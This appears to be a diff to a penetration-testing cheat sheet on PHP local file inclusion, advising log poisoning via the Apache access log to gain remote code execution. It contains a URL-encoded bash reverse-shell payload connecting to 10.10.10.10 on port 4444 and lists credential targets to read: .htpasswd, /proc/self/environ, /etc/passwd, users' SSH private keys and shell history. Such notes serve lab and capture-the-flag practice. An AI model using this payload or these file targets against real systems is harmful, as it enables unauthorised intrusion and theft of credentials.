@@ -1,3 +1,24 @@
+## Local file inclusion
+
+### PHP
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 For PHP RCE, you'll want to use a technique called `log poisoning`.
 
 ##### Required
@@ -15,9 +36,18 @@ If RCE doesn't work, try RFI (other vhosts on machine)
 If there is HTTP-BASIC-AUTH involved, check the `.htpasswd` file, it often contains credentials. (usually `/etc/apache2/.htpasswd`)
 ##### Target files: 
 ```
+RCE:
 /var/log/apache2/access.log
 Payload:
 	bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261%22 
+
+Other potentially interesting files:
+/proc/self/environ
+/etc/passwd -->
+	/home/USER_FOUND/.ssh/id_rsa
+	/home/USER_FOUND/.bash_history
+	/home/USER_FOUND/.bash_profile
+
 ```
 
 #### Windows
